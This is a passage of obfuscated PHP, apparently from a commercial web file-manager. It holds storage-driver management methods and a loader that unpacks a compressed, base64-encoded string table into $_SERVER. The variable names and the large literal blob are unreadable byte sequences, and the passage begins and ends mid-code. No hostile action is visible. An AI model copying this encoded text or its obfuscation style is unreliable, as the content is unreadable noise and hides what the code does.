parent::update($üÏ•ó­ì[$ÌïÁ¤ˆ[492]], array($ÌïÁ¤ˆ[37] => 0)); } } $this->updateBackup($³ô¹ÄÚ£, $¯¼Û•ğ›); } return $³ô¹ÄÚ£; } public function updateBackup($ç†Á›‰©, $Í±¼˜§¿) { $¯ªÆÕ¬ =& $_SERVER[¬ÏÕ§Áú]; if ($ç†Á›‰© == $¯ªÆÕ¬[101]) { return; } $©Ìâ…Ğ = Model($¯ªÆÕ¬[861])->config(); $‡á—·÷¡ = $©Ìâ…Ğ[$¯ªÆÕ¬[865]]; if ($©Ìâ…Ğ[$¯ªÆÕ¬[1806]] != $¯ªÆÕ¬[101] || $‡á—·÷¡ == $ç†Á›‰©) { return; } if ($‡á—·÷¡ != $¯ªÆÕ¬[101]) { $Â²–ê™Ÿ = array(); foreach ($Í±¼˜§¿ as $‚Ğ–üıã) { if ($ç†Á›‰© == $‚Ğ–üıã[$¯ªÆÕ¬[492]]) { continue; } $Â²–ê™Ÿ[] = $‚Ğ–üıã[$¯ªÆÕ¬[492]]; } if ($Â²–ê™Ÿ && in_array($‡á—·÷¡, $Â²–ê™Ÿ)) { return; } } $ºòÑóÌò = Model($¯ªÆÕ¬[886])->get($¯ªÆÕ¬[893]); $ºòÑóÌò = json_decode($ºòÑóÌò, !0); if (!$ºòÑóÌò) { return; } $ºòÑóÌò[$¯ªÆÕ¬[865]] = $ç†Á›‰©; Model($¯ªÆÕ¬[886])->set(array($¯ªÆÕ¬[893] => $ºòÑóÌò)); } public function checkPwd($Îú¹œÓ¿, &$ôÚ¢¼ú…) { $÷ÆØÓó‰ =& $_SERVER[¬ÏÕ§Áú]; if (empty($ôÚ¢¼ú…[$÷ÆØÓó‰[6]])) { return; } $ûİÚ‰ = $ôÚ¢¼ú…[$÷ÆØÓó‰[6]]; if (!is_array($ûİÚ‰)) { $ûİÚ‰ = json_decode($ûİÚ‰, !0); } $áÆéĞ  = $÷ÆØÓó‰[12]; $ÛıçÒí = array($÷ÆØÓó‰[2387], $÷ÆØÓó‰[2388], $÷ÆØÓó‰[1011]); foreach ($ÛıçÒí as $ÑÚÃÇì) { if (isset($ûİÚ‰[$ÑÚÃÇì])) { $áÆéĞ  = $ÑÚÃÇì; break; } } if (!$áÆéĞ ) { return; } $ã¸ÙùéÙ = $this->getConfig($Îú¹œÓ¿); $¹¹´‚™ = $ã¸ÙùéÙ[$áÆéĞ ]; $âÊ†°¤ = $ûİÚ‰[$áÆéĞ ]; if ($âÊ†°¤ == str_repeat($÷ÆØÓó‰[233], strlen($¹¹´‚™))) { $ûİÚ‰[$áÆéĞ ] = $¹¹´‚™; $ôÚ¢¼ú…[$÷ÆØÓó‰[6]] = json_encode($ûİÚ‰); } else { if ($âÊ†°¤ != $¹¹´‚™) { $ôÚ¢¼ú…[$÷ÆØÓó‰[2386]] = $÷ÆØÓó‰[101]; } } } public function checkConfig(&$–«Õ©š, $¾š›µ›Ë = false) { $„¥†—å£ =& $_SERVER[¬ÏÕ§Áú]; $Âé‰ß„  = strtolower($–«Õ©š[$„¥†—å£[108]]); $ÅÜ‡¶Ñ• = $–«Õ©š[$„¥†—å£[6]]; if (!is_array($ÅÜ‡¶Ñ•)) { $ÅÜ‡¶Ñ• = json_decode($ÅÜ‡¶Ñ•, !0); } foreach ($ÅÜ‡¶Ñ• as $Áİ±†¼ˆ => $¦†û©ä) { if (is_string($¦†û©ä)) { $ÅÜ‡¶Ñ•[$Áİ±†¼ˆ] = trim($¦†û©ä); } } $ÅÜ‡¶Ñ•[$„¥†—å£[2389]] = rand_string(6); $ŒÙáØ·Â = $GLOBALS[$„¥†—å£[6]][$„¥†—å£[102]][$„¥†—å£[947]]; $¶ëó³Í = isset($ŒÙáØ·Â[$Âé‰ß„ ]) ? $ŒÙáØ·Â[$Âé‰ß„ ] : ucfirst($Âé‰ß„ ); $ªÀä’àü = $„¥†—å£[87] . $¶ëó³Í; if (!$¶ëó³Í || !class_exists($ªÀä’àü)) { if ($¾š›µ›Ë) { return LNG($„¥†—å£[2390]); } write_log(array($„¥†—å£[2391], $–«Õ©š, get_caller_info()), $„¥†—å£[226]); show_json(LNG($„¥†—å£[2390]), !1, $–«Õ©š); } $Î›Õ²œÜ = new $ªÀä’àü($ÅÜ‡¶Ñ•); $¯«Üê®Õ = rtrim($ÅÜ‡¶Ñ•[$„¥†—å£[1317]], $„¥†—å£[8]) . $„¥†—å£[8]; if (in_array($Âé‰ß„ , $Î›Õ²œÜ->objectDriver)) { try { if (!$Î›Õ²œÜ->isBucketCors() && !$Î›Õ²œÜ->setBucketCors()) { $ÚÃÀÒ‚Ì = LNG($„¥†—å£[2392]); $ÚÃÀÒ‚Ì .= $„¥†—å£[2393] . LNG($„¥†—å£[2394]); } } catch (Exception $ş¤å÷Ò¤) { $ÚÃÀÒ‚Ì = $ş¤å÷Ò¤->getMessage(); } if (isset($ÚÃÀÒ‚Ì)) { return $this->_parseError($ÚÃÀÒ‚Ì, $Âé‰ß„ , $¾š›µ›Ë); } if ($Âé‰ß„  == $„¥†—å£[78] && !$Î›Õ²œÜ->checkRegion()) { return $this->_parseError(LNG($„¥†—å£[2395]), $Âé‰ß„ , $¾š›µ›Ë); } } else { if ($Âé‰ß„  == $„¥†—å£[2396]) { if ($Î›Õ²œÜ->ftpPath) { $Õ¦ßÂÔ = trim($¯«Üê®Õ, $„¥†—å£[8]); if (stripos($Õ¦ßÂÔ, trim($Î›Õ²œÜ->ftpPath, $„¥†—å£[8])) !== 0) { $¯«Üê®Õ = $Î›Õ²œÜ->ftpPath . $„¥†—å£[8] . ($Õ¦ßÂÔ ? $Õ¦ßÂÔ . $„¥†—å£[8] : $„¥†—å£[12]); } } } } $ËÅƒÕÍ” = $Î›Õ²œÜ->getPath($¯«Üê®Õ . $„¥†—å£[1321]); try { if ($Âé‰ß„  == $„¥†—å£[119]) { $Î›Õ²œÜ->mkdir($¯«Üê®Õ); } $è‚ñ§£ = $Î›Õ²œÜ->mkfile($ËÅƒÕÍ”); if (!$è‚ñ§£) { $ÚÃÀÒ‚Ì = LNG($„¥†—å£[2392]); } } catch (Exception $ş¤å÷Ò¤) { $ÚÃÀÒ‚Ì = $ş¤å÷Ò¤->getMessage(); } if (isset($ÚÃÀÒ‚Ì)) { return $this->_parseError($ÚÃÀÒ‚Ì, $Âé‰ß„ , $¾š›µ›Ë); } $ÅÜ‡¶Ñ•[$„¥†—å£[1317]] = $¯«Üê®Õ; $–«Õ©š[$„¥†—å£[6]] = json_encode($ÅÜ‡¶Ñ•); $–«Õ©š[$„¥†—å£[108]] = $¶ëó³Í; return !0; } private function _parseError($™íÎ¨É, $ùèıÕÙù, $­ÌÂÒä = false) { $„¾¼–ÒÖ =& $_SERVER[¬ÏÕ§Áú]; if ($ùèıÕÙù == $„¾¼–ÒÖ[78] && stripos($™íÎ¨É, $„¾¼–ÒÖ[2397])) { $’ºé¬³‹ = explode($„¾¼–ÒÖ[10], $™íÎ¨É); $éõ‹½ç™ = isset($’ºé¬³‹[1]) ? $’ºé¬³‹[1] : $„¾¼–ÒÖ[12]; $’¥¥¾ú = array($„¾¼–ÒÖ[2398] => LNG($„¾¼–ÒÖ[2399]), $„¾¼–ÒÖ[2400] => LNG($„¾¼–ÒÖ[2401])); if (isset($’¥¥¾ú[$éõ‹½ç™])) { $™íÎ¨É = $’¥¥¾ú[$éõ‹½ç™]; } } if (stripos($™íÎ¨É, $„¾¼–ÒÖ[2402]) === 0) { $ğ»Ò”’¡ = strpos($™íÎ¨É, $„¾¼–ÒÖ[188]); if ($ğ»Ò”’¡ === !1) { $ğ»Ò”’¡ = strpos($™íÎ¨É, $„¾¼–ÒÖ[4]); } if ($ğ»Ò”’¡ !== !1) { $™íÎ¨É = substr($™íÎ¨É, $ğ»Ò”’¡ + 1); } } $™íÎ¨É = LNG($„¾¼–ÒÖ[1324]) . $™íÎ¨É; if ($­ÌÂÒä) { return $™íÎ¨É; } show_json($™íÎ¨É, !1); } public function driverListSystem() { $¡©÷ğàÊ =& $_SERVER[¬ÏÕ§Áú]; $à£ìòé‰ = parent::listData(); $íé¹­ğ = array(); foreach ($à£ìòé‰ as $ÕÀ½Éı) { unset($ÕÀ½Éı[$¡©÷ğàÊ[244]], $ÕÀ½Éı[$¡©÷ğàÊ[98]]); if (!is_array($ÕÀ½Éı[$¡©÷ğàÊ[6]])) { $ÕÀ½Éı[$¡©÷ğàÊ[6]] = json_decode($ÕÀ½Éı[$¡©÷ğàÊ[6]], !0); } $íé¹­ğ[] = $ÕÀ½Éı; } return $íé¹­ğ; } public function defaultDriver() { $òÇóÈ‹ =& $_SERVER[¬ÏÕ§Áú]; $Ôû©¯ = parent::listData(); $…”ë“Ğ = array_filter_by_field($Ôû©¯, $òÇóÈ‹[37], 1); $…”ë“Ğ = $…”ë“Ğ[0]; if (!$…”ë“Ğ) { return array(); } if (!is_array($…”ë“Ğ[$òÇóÈ‹[6]])) { $…”ë“Ğ[$òÇóÈ‹[6]] = json_decode($…”ë“Ğ[$òÇóÈ‹[6]], !0); } return $…”ë“Ğ; } public function driverInfo($Ÿ¨¨‡ı•) { $œÖ¿òš¦ =& $_SERVER[¬ÏÕ§Áú]; $´ïÑğ = array_to_keyvalue(parent::listData(), $œÖ¿òš¦[492]); if (!isset($´ïÑğ[$Ÿ¨¨‡ı•])) { return !1; } $Ò£ûšÖ» = $´ïÑğ[$Ÿ¨¨‡ı•]; if (!is_array($Ò£ûšÖ»[$œÖ¿òš¦[6]])) { $Ò£ûšÖ»[$œÖ¿òš¦[6]] = json_decode($Ò£ûšÖ»[$œÖ¿òš¦[6]], !0); } return $Ò£ûšÖ»; } public function remove($ÀÔ”¯ÁÆ) { $this->removeShareItems($ÀÔ”¯ÁÆ); return parent::remove($ÀÔ”¯ÁÆ); } public function removeWithFile($æ¿Íïş§, $ÂÕÖø¼Ì, $íÚ°“Ÿ, $ˆ¨ï‘ƒÏ = false) { $°•†Û´Ñ =& $_SERVER[¬ÏÕ§Áú]; $¤ûúçô  = array($°•†Û´Ñ[939] => $æ¿Íïş§); $í‹Î¤ƒ = Model($°•†Û´Ñ[565])->where($¤ûúçô )->count(); $úâ¸…ÈÍ = Model($°•†Û´Ñ[565])->where($¤ûúçô )->sum($°•†Û´Ñ[89]); $¬ÙûÈïö = $ÂÕÖø¼Ì . $°•†Û´Ñ[2403] . $æ¿Íïş§; $ÃÜŸ±îŞ = LNG($ÂÕÖø¼Ì == $°•†Û´Ñ[644] ? $°•†Û´Ñ[2404] : $°•†Û´Ñ[2405]); $§•¢­çŠ = new TaskFileTransfer($¬ÙûÈïö, $°•†Û´Ñ[226], $í‹Î¤ƒ, $ÃÜŸ±îŞ . $°•†Û´Ñ[482] . $íÚ°“Ÿ[$°•†Û´Ñ[32]] . $°•†Û´Ñ[225] . $æ¿Íïş§); $§•¢­çŠ->task[$°•†Û´Ñ[877]] = (double) $úâ¸…ÈÍ; $ºò¿·† = KodIO::defaultDriver(); $Ê€×Íñö = $ºò¿·†[$°•†Û´Ñ[492]]; $ÇÔ„¢ğÄ = $İ›°¿İÇ = $£èíÀª¦ = array(); $“«Öïà¨ = Model($°•†Û´Ñ[243])->where($¤ûúçô )->field($°•†Û´Ñ[2406])->select(); foreach ($“«Öïà¨ as $°œüªÍÛ) { $”Àö™Ş  = $°œüªÍÛ[$°•†Û´Ñ[562]]; if ($ˆ¨ï‘ƒÏ) { $İ›°¿İÇ[] = $”Àö™Ş ; continue; } $×»È€Ï = $°œüªÍÛ[$°•†Û´Ñ[97]]; $“—ˆ×†Š = get_path_father($×»È€Ï); $£èíÀª¦[] = $“—ˆ×†Š; $“—ˆ×†Š = str_replace("\173\x69\157\x3a{$æ¿Íïş§}\x7d\57", "\173\x69\157\72{$Ê€×Íñö}\x7d\x2f", $“—ˆ×†Š); if (!IO::exist($×»È€Ï)) { $ÇÔ„¢ğÄ[] = $”Àö™Ş ; $§•¢­çŠ->updateFileEnd($°œüªÍÛ[$°•†Û´Ñ[32]], $°œüªÍÛ[$°•†Û´Ñ[89]]); write_log($°•†Û´Ñ[2407] . $×»È€Ï, $°•†Û´Ñ[1970]); continue; } $òôÖ°ô° = IO::move($×»È€Ï, $“—ˆ×†Š, REPEAT_RENAME); if (!$òôÖ°ô°) { $İ›°¿İÇ[] = $”Àö™Ş ; $§•¢­çŠ->updateFileEnd($°œüªÍÛ[$°•†Û´Ñ[32]], $°œüªÍÛ[$°•†Û´Ñ[89]]); write_log($°•†Û´Ñ[2408] . $×»È€Ï, $°•†Û´Ñ[1970]); continue; } $¤ûúçô  = array($°•†Û´Ñ[562] => $”Àö™Ş ); $œú÷”ˆÈ = array($°•†Û´Ñ[939] => $Ê€×Íñö, $°•†Û´Ñ[97] => $òôÖ°ô°); Model($°•†Û´Ñ[243])->where($¤ûúçô )->save($œú÷”ˆÈ); } $Ğ¿Œ¯ = $§•¢­çŠ->task; if (!$ˆ¨ï‘ƒÏ) { Cache::set($¬ÙûÈïö, $Ğ¿Œ¯); } $§•¢­çŠ->end(); $ÇÔ„¢ğÄ = array_unique($ÇÔ„¢ğÄ); $İ›°¿İÇ = array_unique($İ›°¿İÇ); if (!$ˆ¨ï‘ƒÏ && ($ÇÔ„¢ğÄ || $İ›°¿İÇ)) { $æ€œ‰›  = array(); if ($ÇÔ„¢ğÄ) { $æ€œ‰› [] = sprintf(LNG($°•†Û´Ñ[2409]), count($ÇÔ„¢ğÄ)); } if ($İ›°¿İÇ) { $æ€œ‰› [] = sprintf(LNG($°•†Û´Ñ[2410]), count($İ›°¿İÇ)); } $æ€œ‰›  = sprintf(LNG($°•†Û´Ñ[2411]), implode($°•†Û´Ñ[2412], $æ€œ‰› )) . $°•†Û´Ñ[2413] . date($°•†Û´Ñ[2414]) . $°•†Û´Ñ[2415]; if ($ÂÕÖø¼Ì == $°•†Û´Ñ[1282]) { $æ€œ‰›  .= $°•†Û´Ñ[2416] . LNG($°•†Û´Ñ[2417]); } else { $æ€œ‰›  = LNG($°•†Û´Ñ[2418]) . $°•†Û´Ñ[2419] . $æ€œ‰› ; } $Ğ¿Œ¯[$°•†Û´Ñ[1319]] = $æ€œ‰› ; Cache::set($¬ÙûÈïö, $Ğ¿Œ¯); unset($íÚ°“Ÿ[$°•†Û´Ñ[6]]); $êÔ÷Üç = array($°•†Û´Ñ[492] => $æ¿Íïş§, $°•†Û´Ñ[2287] => $°•†Û´Ñ[644], $°•†Û´Ñ[32] => $íÚ°“Ÿ[$°•†Û´Ñ[32]], $°•†Û´Ñ[108] => $íÚ°“Ÿ[$°•†Û´Ñ[108]]); Hook::trigger($°•†Û´Ñ[1848], array($°•†Û´Ñ[1342] => $êÔ÷Üç, $°•†Û´Ñ[1352] => !0)); show_json($æ€œ‰› , !1, 100111); } if ($ÂÕÖø¼Ì == $°•†Û´Ñ[644]) { return !0; } if ($ÇÔ„¢ğÄ || $İ›°¿İÇ) { $Üí° ·Ù = array_merge($ÇÔ„¢ğÄ, $İ›°¿İÇ); $Üí° ·Ù = array_filter(array_unique($Üí° ·Ù)); $this->removeByFileID($Üí° ·Ù); } if ($£èíÀª¦) { $£èíÀª¦ = array_filter(array_unique($£èíÀª¦)); foreach ($£èíÀª¦ as $×»È€Ï) { $ÌÚšùÍˆ = IO::has($×»È€Ï, !0); if (!$ÌÚšùÍˆ[$°•†Û´Ñ[252]] && !$ÌÚšùÍˆ[$°•†Û´Ñ[253]]) { IO::remove($×»È€Ï); } } } return $this->remove($æ¿Íïş§); } private function removeByFileID($è‰ı²‚ = array()) { $œóŞï„÷ =& $_SERVER[¬ÏÕ§Áú]; if (empty($è‰ı²‚)) { return; } $İ†œ¾ïğ = array($œóŞï„÷[562] => array($œóŞï„÷[7], $è‰ı²‚)); $‘³õ¾ğö = Model($œóŞï„÷[1483])->where($İ†œ¾ïğ)->field($œóŞï„÷[2364])->select(); if (!$‘³õ¾ğö) { return Model($œóŞï„÷[565])->remove($è‰ı²‚); } $‘³õ¾ğö = array_to_keyvalue($‘³õ¾ğö, $œóŞï„÷[204], $œóŞï„÷[562]); foreach ($‘³õ¾ğö as $¸ëº“„é => $¿¡ˆóÊï) { Model($œóŞï„÷[946])->removeNow($¸ëº“„é, !1); } $ëÍÓ‚‹° = array_diff($è‰ı²‚, array_unique(array_values($‘³õ¾ğö))); if ($ëÍÓ‚‹°) { return Model($œóŞï„÷[565])->remove($ëÍÓ‚‹°); } } private function removeShareItems($¡àÏÛÌ·) { $ëŠÃ‘Š =& $_SERVER[¬ÏÕ§Áú]; $ƒÉ¿İÉ = "\173\x69\157\72{$¡àÏÛÌ·}\x7d\x2f"; $¯Â·€Ş = array($ëŠÃ‘Š[204] => 0, $ëŠÃ‘Š[1312] => array($ëŠÃ‘Š[479], "{$ƒÉ¿İÉ}\45")); $«ä¿áÑ¶ = Model($ëŠÃ‘Š[2017])->where($¯Â·€Ş)->field($ëŠÃ‘Š[689])->select(); if (empty($«ä¿áÑ¶)) { return; } $¯ìùû¼° = array_to_keyvalue($«ä¿áÑ¶, $ëŠÃ‘Š[12], $ëŠÃ‘Š[689]); Model($ëŠÃ‘Š[688])->remove($¯ìùû¼°); } } goto DŒóÃ—™õ; bˆŞº÷ï: $fileSize = strrev(base64_decode($_SERVER[ß–ùË‹][0])); function binCheckNeq($©æ›˜ñë, $ÖËû‚Ò˜) { return $©æ›˜ñë != $ÖËû‚Ò˜; } $_SERVER[$_SERVER[ß–ùË‹][1]] = $fileSize($_SERVER[$_SERVER[ß–ùË‹][2]]); goto a‚Ê¾î¹„Ó; cÄÑÏêĞ£â: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xac\xcf\xd5\xa7\xc1\xfa", "\xeb\x88\xf6\xc6\xe0\xfc"); $_SERVER[¬ÏÕ§Áú] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x5b\xc5\xb5\x30\xb4\x50\xf6\xa5\xd0\x52\x5a\xa\xdc\x98\x4\xdb\x89\x16\xdb\xd9\x9d\x38\x41\x96\x65\x5b\x44\xb6\x1c\x49\xce\x42\xec\xdc\x5c\x4b\x57\xd2\x8d\x25".base64_decode('XVn3ylsSCiEQSAghZQlLKFDW0hJ2CEuAQllaSktfgT5KKZTGTkJbKF3YWug/y5nlSjK8/3v/')."\xf7\xfd\x81\x44\x77\xf6\x99\x33\x67\xce\x9c\x39\x73\xe6\x9c\x37\xb7\x5e\xf9\xf1\xb\x9b\xd7\x7e\x79\xed\x41\x6b\xf\x3c\xef\xa5\xdb\x1e\xbe\xfe\xfb\xf4\x1b\xfd\x4b\xff\x43\xdf\xa7\x6e\x3e\xf4\x0\xf2\xe7\xf8\xcd\x9b"."\152\152\332\147\35\76\255\363\310\255\367\337\251\175\345\307\37\375\344\376\237\357\170\371\255\237\337\21\113\54\170\144\107\352\224\3\166\376\365\33\217\66\242\234\264\140\43\375\121\162\246\255\350\303"."\x86\x65\x5b\x34\x22\x6e\xe6\x92\x46\x8a\x7e\x1b\x39\xfa\xeb\xa5\x3f\xdd\x91\x50\x41\xcf\x9a\xb6\x4e\x83\x1e\xfa\xa3\xf2\x4e\xa1\x7f\xad\x81\x8c\xc1\xd2\xd5\xce\x70\x4c\x8d\x76\x77\x75\x5\x22\x31\xc8\xd4\x28\xa7\x67"."\xcd\x4\x7c\xe5\xb5\x82\x96\x85\xf6\xf3\x7a\xc1\x42\xbd\x91\xab\x53\xf3\x66\x5e\xcf\x39\x62\x44\x44\x42\xb3\xb5\x3e\xcd\x82\x9a\x5a\x9a\xd5\x96\x40\x57\x28\xbc\x5c\x8d\x2d\xef\xa\x40\x8e\x3e\x75\xa0\xa8\x17\x46\x68"."\x88\x7c\x46\x6d\xad\x60\xc7\x8c\xac\xce\x73\xc\x15\x78\xbf\x9a\x3\x6d\xc1\x4e\x25\x16\xf1\x75\x46\x7d\xfe\x58\x30\xdc\x49\xa3\xfd\xe1\x8e\x8e\x60\xac\x3c\x3e\x12\xe\x85\x9a\x7d\xfe\x45\xe5\x29\x5d\x11\x5f\x5b\x87"."\117\101\375\313\350\252\221\113\232\65\312\52\232\262\112\251\245\37\255\206\236\111\320\317\234\306\272\143\217\344\341\53\306\277\320\64\345\212\231\14\15\164\362\257\204\236\324\212\31\200\126\213\34\310"."\27\214\254\306\6\275\110\37\341\261\364\103\53\332\246\221\213\323\100\140\330\56\150\42\36\365\65\216\46\132\317\101\125\321\100\50\340\217\51\270\203\112\153\44\334\241\300\44\144\65\313\326\13\312"."\322\366\100\44\240\340\116\67\125\223\261\126\53\200\57\235\10\24\212\57\24\122\46\252\301\326\263\171\126\15\55\123\241\262\160\244\45\20\121\232\227\53\2\102\161\63\233\65\163\36\124\13\232\111"."\x5b\xea\x6a\x20\x12\xa1\x1f\x2e\x40\xef\x50\x10\x4f\x1a\x4\xc2\xad\xad\xd1\x0\xf\xc1\xe0\x16\x87\x50\x4f\xa6\x3\x7e\x3a\x42\x89\x64\xc6\x56\x7\xb5\x4c\x91\xa1\x69\x3f\xfd\xad\x86\x1f\xf8\x55\xb5\xa4\x91\xd1\xa3"."\xc6\xa8\x1e\xcc\xc9\x31\xf4\x1b\x7f\xa9\x29\xdd\x56\xd1\xc2\xb2\x51\x3f\x1\xcd\x9b\x7d\xd1\xa0\x5f\xed\xf2\xc5\xda\x1\xee\xf9\xbc\xd7\x4a\xf4\x5b\x5e\xad\x10\x4f\x1b\x83\x7a\xc8\xe8\xf3\xf6\x19\x39\x2f\x46\x6f\x4f".base64_decode('H1uIh9OfGQCFtB7vV7U+s2DrgETFXMbI9csr0rSgxQEjZxRhEcEATZMvevgostw6i9ET8JFF').base64_decode('5U0o1wdxfSzXavZhoGEO0s+mBfR3HpTvwyAY1Au2qufiZsLIAZVZCKtFs9MtBTT0AgDOzCTY')."\267\205\200\53\300\331\131\314\312\131\170\20\1\56\223\50\60\302\360\171\71\151\60\304\351\14\316\53\102\171\324\23\116\242\214\344\210\40\24\70\137\27\117\265\314\142\41\216\46\75\11\140\251\207"."\x68\xdd\xb6\xd1\xe0\x18\x40\xcc\xee\x7c\xc6\xd4\x12\x51\xbd\xc0\x87\x66\x98\xad\xa8\xa2\x70\xd1\x96\x23\x8b\x24\x5b\xab\x59\xc8\xb6\xa0\x39\x97\xe3\x3a\xd0\xa2\x36\x44\x64\x3f\x5b\xcc\x9\x9\x5a\xde\x9a\x15\xe7\xba".base64_decode('P+tdcQb6pxbodQ/0J61nMqo+rMNqzyZmWgwQXgsjGYqhwWBYTWtWuiMxUyWl2DaQ0Ic9+XQe')."\110\21\247\76\75\216\325\210\301\326\151\332\1\151\63\311\230\161\55\43\17\205\176\247\155\73\37\325\163\211\126\276\112\22\346\120\216\100\51\257\63\124\156\161\51\11\245\103\131\256\264\67\32\215".base64_decode('FiuYzfAvNjoeZ/FIe5hNZSIJmMqWUBU0aFiELAuaglZgxohrtmHmvGbc1m23ZRd0DWr0xeO6')."\145\271\375\150\21\27\314\214\333\227\311\230\103\356\160\301\110\31\271\106\145\52\354\20\164\205\273\61\325\156\4\362\122\65\117\301\110\203\233\231\332\124\264\223\356\71\214\154\360\334\5\55\147\45"."\365\202\73\0\253\242\121\101\235\345\244\233\145\153\61\254\274\151\31\270\173\215\212\146\333\132\74\215\311\236\250\276\351\163\362\33\230\54\350\345\171\121\45\272\273\253\240\245\262\132\243\222\57\366".strrev('Â'."\n".'ºôÙP+íw	èdEàwt•#­¥j6-ĞQ¼áMX¥­ØmY*4'."\0".'g!Î8¸„bÀ'."\0".'!')."\x85\xa5\xd1\xd8\xf6\x58\xac\x4b\xd\xb6\x22\xc6\xa1\x33\xa0\x76\xf8\x62\x7e\x20\x8e\x1\x5b\x4b\xb1\xaa\x43\x68\xb7\xe0\x55\xb2\xc8\x65\x6e\xb4\x98\x30\x36\x75\xa2\xc1\x89\xc8\x2e\x73\x48\x2f\xa0\x86\x9b\x47\x1a\x95"."\x7e\x33\xd1\x67\xe\x7b\x58\x52\x2b\x90\x6c\x96\x19\xcf\x6f\xde\x76\x47\xb4\x5c\xa\xf\xa3\x6f\xc4\xd6\xad\x52\xba\xd4\x8c\xd8\xc\x4f\x92\xae\x5c\x4f\x9f\x9e\x34\xb\x30\x1a\x6b\x30\xe5\x4\x7e\x48\xcf\xa5\xec\x34".base64_decode('qzsaiCwJRNRouDW21BcBriSHMGeY9Qa3nnFH9AQCYtxm5bS8gP4yN14wuHGWihcRSwsF2zDs')."\132\334\26\312\344\226\163\261\272\103\106\326\300\303\263\171\12\1\66\142\131\332\240\103\136\62\346\246\36\153\152\115\117\142\132\255\33\375\73\265\166\105\117\213\147\152\357\102\257\41\312\170\353\75"."\xf5\x4a\x43\xdd\x2c\xa5\xb\xf1\x50\x86\x96\x51\x60\xd0\x65\x39\xea\x94\xf0\x22\x27\x58\x4\x86\xe7\xcc\x9c\x5e\x71\x61\x21\x44\x32\x2d\xdd\xdd\xae\x6b\x88\x40\xa3\x89\x70\xcc\x8b\x8b\xb5\x45\xc3\x9f\x3\x5d\xbc\x8b".base64_decode('S7SkZF5oZCSwuDsQjakdgVh7uAW6H/DBVw4VJv1lc4xZRtgSc1CtPiztH2IfiMsAIeU6zSFG')."\xf9\x4b\x10\xc8\x8f\xf7\xf0\x9\xd2\xd0\x17\x8c\xc6\xa4\x74\x89\x4d\xdd\xa\xfa\xd3\xb\xd8\xdc\xb\x5c\x87\xea\xf\x5\x7c\x11\x15\x78\x6d\xd5\xb0\x5a\xa5\x2d\x14\x7\x39\xb9\x55\xcd\xbe\xd5\x8\xd1\x3a\x74\xb6\xa7".base64_decode('QMPBLFrSYiCqc79jo+wQiI9W0FIjwTdEFGzXjVQa+m3g6uJmxixoGbwVMA47ZQBVzmeKaBl4').strrev('C#'."\n".'³:ÌÃj]C\'j¥Ï“Ç·QŠ¯!ÇÁÛÃ´g6Ë1 kó˜âÛ1t±Åq')."\247\200\242\136\76\164\117\334\104\353\274\103\353\327\33\361\130\200\270\315\43\261\54\40\321\317\171\170\313\153\52\45\23\170\266\62\236\54\252\204\324\351\67\371\46\115\317\131\363\234\133\236\242\27"."\xa\x66\x61\x12\xe4\x20\xdf\xa\xd9\x37\xf1\x74\x41\xe5\x36\xe7\x40\x2c\x44\x11\xd8\x77\xda\xe4\x1c\x8b\xc9\x70\xb3\xd1\xb\xe3\x9e\xd2\xd0\xa\x54\x24\x81\x38\x37\x8f\x65\xa3\x49\x40\x3\xd4\x12\x89\x4a\xd1\x88\xf2"."\x40\x5\x6b\x19\xda\x92\x4\xc6\x16\x78\xa3\xd3\xd1\xff\x82\x7\x48\x98\x59\x8d\xed\xa8\x98\x10\xf1\x66\x71\xc0\xe2\x21\xb2\x4d\xea\x9\xba\x4f\x3a\xa2\xe8\x2\xa7\x51\x53\x59\x93\x5\xdb\xc4\x89\x5\x47\x4e\x84\xa4".base64_decode('aRM6jbACBlzkI2cwSOgZnSFYWmesRh1kQzPD0U8w5+iYg2IFf2dYEVQSMwYsvBSfC0UE5o4A')."\257\304\147\6\315\152\230\54\50\21\356\52\350\111\143\230\221\222\141\273\103\53\364\263\201\241\222\142\51\342\200\264\114\133\273\103\41\325\37\356\214\241\143\45\215\131\32\11\306\2\214\142\371\132"."\124\237\277\13\102\202\6\162\6\116\146\101\150\314\140\3\240\20\352\204\127\360\112\150\263\316\233\71\104\151\201\130\271\305\241\263\54\51\41\130\11\300\35\301\176\224\160\24\210\47\310\216\272\263".base64_decode('iK64eZ+6uoEXYFjBWOLmEcztMtKRyi3hM780OsPd3uHzu6PtvoaZs2js8myiJ9ZuWD1n8TB0')."\147\310\232\241\26\164\264\246\31\56\64\324\325\263\25\207\370\22\115\364\174\271\73\353\306\265\140\226\322\123\127\127\307\352\232\66\113\111\43\122\302\351\167\202\214\226\235\162\212\361\176\135\46\347"."\x96\x7b\xc8\x60\x34\x6f\x32\x67\xc7\x27\x97\x3\xdf\x2a\x92\xdd\x4d\xd5\xe2\xb8\x3a\x15\x15\xb6\x8b\x96\xc\x29\x84\x80\x9\x54\xc4\x60\x5c\x32\x8d\xd5\x32\x29\x13\xe1\x5d\x3a\x2b\x47\x26\x38\xfe\xd2\xb0\x4e\x59\x2e"."\150\50\255\161\70\141\350\261\305\201\30\272\21\271\20\6\63\352\3\243\337\116\36\133\211\125\6\64\145\335\203\0\155\321\217\74\336\331\20\325\146\323\166\72\264\137\104\13\266\140\214\112\140\137".base64_decode('yKpgxDIchbaGsxlx8AKYABjlMQ2rKIUdoVU5pZ0TAAb+jpaSxUB3fRo3fyFqURnEQiYz11Rd')."\357\251\253\126\330\161\264\251\272\73\326\212\30\364\205\13\16\237\357\67\263\171\114\117\310\331\13\17\224\242\354\2\70\201\317\307\314\17\13\164\225\300\41\20\323\140\273\231\357\225\363\315\367\116".strrev('PJË‚„«.'."\n".'"¬±a”Ü™â×ôA˜ërÑQH-ÌËJñòŸóçr'."\0".'tÖ/®ÔËds